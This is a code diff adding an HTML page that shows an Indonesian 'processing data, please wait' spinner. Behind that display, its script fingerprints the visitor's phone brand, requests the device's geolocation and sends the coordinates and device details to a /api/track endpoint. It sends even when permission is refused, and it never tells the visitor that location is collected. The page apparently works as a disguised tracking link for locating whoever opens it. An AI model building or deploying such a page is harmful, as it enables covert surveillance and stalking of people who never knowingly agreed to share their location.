@@ -1,0 +1,45 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Memuat...</title>
+<style>
+  body { font-family: system-ui, sans-serif; text-align: center; padding: 50px; background: #0a0a0c; color: #fff; }
+  h2 { color: #00d2ff; margin-bottom: 5px; }
+  p { color: #666; font-size: 14px; }
+  .loader { border: 3px solid #222; border-top: 3px solid #00d2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head><body>
+<div class="loader"></div>
+<h2>Memproses Data</h2>
+<p>Mohon tunggu sebentar...</p>
+<script>
+function getInfo() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Redmi")) return "REDMI XIAOMI";
+  if (ua.includes("OPPO")) return "OPPO CPH";
+  if (ua.includes("Samsung")) return "SAMSUNG GALAXY";
+  if (ua.includes("iPhone")) return "IPHONE";
+  if (ua.includes("Infinix")) return "INFINIX";
+  if (ua.includes("Vivo")) return "VIVO";
+  return ua.split("(")[0].trim() || "Mobile Device";
+}
+
+function sendData(lat, lon) {
+  const id = btoa(getInfo())
+  fetch('/api/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ id, device: getInfo(), lat, lon })
+  });
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
+    (err) => sendData(null, null)
+  );
+} else {
+  sendData(null, null);
+}
+</script>
+</body></html>
